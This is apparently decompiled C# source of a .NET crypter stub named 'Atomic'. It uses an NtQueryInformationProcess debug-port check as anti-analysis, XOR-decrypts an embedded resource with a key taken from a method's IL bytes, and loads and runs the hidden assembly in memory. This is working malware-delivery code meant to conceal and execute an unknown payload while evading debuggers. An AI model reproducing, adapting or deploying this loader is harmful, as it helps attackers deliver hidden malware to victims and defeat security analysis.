using System;
using System.Diagnostics;
using System.IO;
using System.IO.Compression;
using System.Reflection;
using System.Runtime.InteropServices;

namespace Atomic
{
	// Token: 0x02000002 RID: 2
	internal static class Program
	{
		// Token: 0x06000001 RID: 1
		[DllImport("ntdll.dll", ExactSpelling = true, SetLastError = true)]
		public static extern int NtQueryInformationProcess([In] IntPtr ProcessHandle, [In] int ProcessInformationClass, out IntPtr ProcessInformation, [In] int ProcessInformationLength, [Optional] out int ReturnLength);

		// Token: 0x06000002 RID: 2 RVA: 0x00002050 File Offset: 0x00000250
		[STAThread]
		private static void Main()
		{
			IntPtr structure = new IntPtr(0);
			Module module = new StackTrace().GetFrame(0).GetMethod().Module;
			int num;
			Program.NtQueryInformationProcess(Process.GetCurrentProcess().Handle, 7, out structure, Marshal.SizeOf<IntPtr>(structure), out num);
			Stream manifestResourceStream = Assembly.GetExecutingAssembly().GetManifestResourceStream("Name_Resource");
			byte[] array = new byte[manifestResourceStream.Length + (long)structure.ToInt32()];
			manifestResourceStream.Read(array, structure.ToInt32(), array.Length + structure.ToInt32());
			Program.NtQueryInformationProcess(Process.GetCurrentProcess().Handle, 7, out structure, Marshal.SizeOf<IntPtr>(structure), out num);
			byte[] ilasByteArray = module.Assembly.ManifestModule.ResolveMethod(123456789 + structure.ToInt32()).GetMethodBody().GetILAsByteArray();
			array = Program.Decrypt(array, ilasByteArray);
			Assembly assembly = Assembly.Load(array);
			Program.NtQueryInformationProcess(Process.GetCurrentProcess().Handle, 7, out structure, Marshal.SizeOf<IntPtr>(structure), out num);
			MethodInfo entryPoint = assembly.EntryPoint;
			object obj = assembly.CreateInstance(entryPoint.ToString());
			entryPoint.Invoke(obj, null);
		}

		// Token: 0x06000003 RID: 3 RVA: 0x00002170 File Offset: 0x00000370
		public static byte[] Decrypt(byte[] plain, byte[] Key)
		{
			for (int i = 0; i < 5; i++)
			{
				for (int j = 0; j < plain.Length; j++)
				{
					plain[j] ^= Key[j % Key.Length];
					for (int k = 0; k < Key.Length; k++)
					{
						plain[j] = (byte)((int)plain[j] ^ ((int)Key[k] << i ^ k) + j);
					}
				}
			}
			return plain;
		}

		// Token: 0x06000004 RID: 4 RVA: 0x000021CC File Offset: 0x000003CC
		public static byte[] Decompress(byte[] data)
		{
			MemoryStream stream = new MemoryStream(data);
			MemoryStream memoryStream = new MemoryStream();
			using (DeflateStream deflateStream = new DeflateStream(stream, CompressionMode.Decompress))
			{
				deflateStream.CopyTo(memoryStream);
			}
			return memoryStream.ToArray();
		}
	}
}
